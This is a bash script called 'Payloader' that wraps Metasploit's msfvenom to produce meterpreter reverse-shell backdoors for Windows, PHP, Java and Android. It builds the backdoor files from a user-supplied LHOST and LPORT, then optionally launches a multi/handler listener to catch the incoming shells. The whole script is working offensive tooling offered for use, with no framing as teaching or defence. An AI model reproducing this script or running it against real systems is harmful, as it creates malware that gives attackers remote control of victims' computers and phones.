azul='\033[01;34m'
vermelho='\033[01;31m'
verde='\033[01;32m'
amarelo='\033[01;33m'
branco='\033[01;37m'
figlet "Payloader"
echo "============- Created by unknwhp -============"
echo
echo
echo "$azul [*]$branco starting ..."
if [ $(id -u) != 0 ]
then
	echo
	echo "$vermelho [!] error ... $branco please run the script as root"
	exit
else
	echo
	echo  "$verde [+]$branco script started successfully!"
fi
echo
dir='/usr/bin/msfconsole'
if [ -e $dir ]
then
	echo "$verde [+]$branco metasploit founded!"
else
	echo
	echo "$vermelho [!]$branco metasploit not founded"
	exit
fi
echo
echo
echo "	$amarelo [1]$vermelho >$branco windows/meterpreter/reverse_tcp"
echo
echo  "	$amarelo [2]$vermelho >$branco windows/meterpreter/reverse_http"
echo
echo "	$amarelo [3]$vermelho >$branco php/meterpreter/reverse_tcp"
echo
echo "	$amarelo [4]$vermelho >$branco java/meterpreter/reverse_tcp"
echo
echo "	$amarelo [5]$vermelho >$branco android/meterpreter/reverse_tcp"

echo
echo
echo
echo "$amarelo Choose a payload:"
echo
echo -n "$verde payload> $branco" && read payload
echo
echo "$amarelo Choose the lhost:"
echo
echo -n "$verde lhost> $branco" && read lhost
echo
echo "$amarelo Choose on  which port will you reveice the conection:" 
echo
echo -n "$verde lport> $branco" && read lport
echo
echo "$amarelo Name to save the backdoor:"
echo
echo -n "$verde name> $branco" && read name
echo
if [ $payload -eq 1 ]
then
	echo "$azul [*]$branco creating backdoor ..."
        echo
	cd output
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $name.exe 2>/dev/1
	pay='windows/meterpreter/reverse_tcp'
	echo "$verde [+]$branco backdoor created as $name.exe"
elif [ $payload -eq 2 ]
then
	echo "$azul [*]$branco creating backdoor ..."
        echo
        cd output
        msfvenom -p windows/meterpreter/reverse_http LHOST=$lhost LPORT=$lport -f exe > $name.exe 2>/dev/2
	pay='windows/meterpreter/reverse_http'
        echo "$verde [+]$branco backdoor created as $name.exe"
elif [ $payload -eq 3 ]
then
	echo "$azul [*]$branco creating backdoor ..."
        echo
        cd output
        msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $name.php 2>/dev/3
	pay='php/meterpreter/reverse_tcp'
        echo "$verde [+]$branco backdoor created as $name.php"
elif [ $payload -eq 4 ]
then
	echo "$azul [*]$branco creating backdoor ..."
        echo
        cd output
        msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f jar > $name.jar 2>/dev/4
	pay='java/meterpreter/reverse_tcp'
        echo "$verde [+]$branco backdoor created as $name.jar"
elif [ $payload -eq 5 ]
then
	echo "$azul [*]$branco creating backdoor ..."
        echo
        cd output
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $name.apk 2>/dev/5
	pay='android/meterpreter/reverse_tcp'
        echo "$verde [+]$branco backdoor created as $name.apk"
fi
echo
echo -n "$azul [*]$amarelo do you want to start the handler $verde (y/n) $branco" && read resposta
yes='y'
if [ $resposta=$yes ]
then
	echo
	service postgresql start
	echo "$verde [+]$branco Database started!"
	echo
	echo "$azul [*]$branco Loading metasploit"
	echo
	msfconsole -x "use multi/handler; set payload $pay; set lhost $lhost;
	set lport $lport; exploit;"
else
        echo
        echo "$verde Thank you for using the tool!"
        echo
        echo "$vermelho EXITING . . ."
        exit 0
fi
